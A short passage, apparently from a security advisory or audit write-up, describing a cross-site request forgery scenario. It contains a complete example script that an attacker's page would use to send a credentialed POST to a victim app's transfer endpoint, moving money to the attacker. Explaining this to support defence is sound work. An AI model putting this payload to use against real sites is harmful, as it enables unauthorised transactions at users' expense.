**Exploit scenario:**

An attacker hosts a page containing:
```html
<script>
fetch("https://victim-app.com/api/transfer", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  credentials: "include",
  body: JSON.stringify({ from: "victim", to: "attacker", amount: 10000 })
});
